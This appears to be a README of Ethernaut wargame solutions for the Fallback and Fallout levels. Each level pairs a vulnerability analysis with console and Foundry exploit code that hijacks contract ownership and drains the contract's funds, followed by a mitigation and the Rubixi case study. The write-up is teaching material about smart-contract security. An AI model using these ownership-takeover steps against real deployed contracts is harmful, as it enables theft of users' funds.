# OpenZeppelin Ethernaut Solutions (Foundry)

This repository contains my exploit scripts, vulnerability analyses, and Proof of Concepts (PoCs) for the OpenZeppelin Ethernaut smart contract wargame, built using the Foundry framework.

---

## Level 1: Fallback

### Objective
Claim ownership of the contract to drain its balance.

### Vulnerability Analysis
The critical vulnerability exists within the `receive()` fallback function. The developer mistakenly placed the ownership transfer logic inside this function. Because `receive()` is automatically triggered when plain Ether is sent to the contract, anyone who meets the `require` conditions can hijack the contract.

### Exploit Steps

**Method 1: Web3 Console (Browser)**
1. **Bypass the requirement:** Send a small amount of ETH to pass the `contributions[msg.sender] > 0` check.
```javascript
await contract.contribute({ value: toWei("0.0001") });
```

2. **Trigger the fallback:** Send a blank transaction with ETH to trigger the `receive()` function and claim ownership.
```javascript
await contract.sendTransaction({ value: toWei("0.0001") });
```


3. **Drain the funds:** Execute the restricted withdraw function.
```javascript
await contract.withdraw();
```



**Method 2: Foundry (PoC)**

```solidity
// Step 1: Contribute to bypass the require statement
fallbackContract.contribute{value: 0.0001 ether}();

// Step 2: Trigger receive() via a low-level call
(bool success, ) = address(fallbackContract).call{value: 0.0001 ether}("");
require(success, "Transaction failed");

// Step 3: Drain the contract
fallbackContract.withdraw();
```

### Mitigation (The Fix)

Do not use fallback or `receive()` functions to handle critical state changes like ownership transfers. Ownership changes should be handled by dedicated, explicit functions protected by proper access control modifiers (like OpenZeppelin's `Ownable` contract).

---

## Level 2: Fallout

### Objective
Claim ownership of the contract.

### Vulnerability Analysis
The intended constructor function is misspelled as `Fal1out` (using the number '1') instead of `Fallout`. In older versions of Solidity (prior to 0.4.22), constructors were defined by creating a function with the exact same name as the contract. Because of this typo, the compiler treats `Fal1out()` as a regular, publicly accessible function rather than a constructor. This allows anyone to call it after deployment and overwrite the `owner` state variable.

### Exploit Steps

**Method 1: Web3 Console (Browser)**
1. **Trigger the public function:** Call the misspelled constructor to overwrite the owner variable.
```javascript
await contract.Fal1out();

```

2. **Verify ownership:** Check if your address is now the owner.

```javascript
await contract.owner();

```

**Method 2: Foundry (PoC)**

```solidity
// Step 1: Call the misspelled constructor function
falloutContract.Fal1out();

// Step 2: Verify ownership transfer (Test assertion)
assertEq(falloutContract.owner(), hacker, "Hack failed: Hacker is not the owner");

```

### Mitigation (The Fix)

Use the `constructor()` keyword introduced in Solidity 0.4.22 instead of naming the function after the contract. This prevents accidental typos from exposing critical initialization logic as regular public functions. (Note: Modern Solidity versions like 0.8.x completely removed support for contract-named constructors to eliminate this exact class of vulnerability).

### Case Study

The story of Rubixi is a very well-known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:

```solidity
contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
  ...

```

This allowed the attacker to call the old constructor, claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.
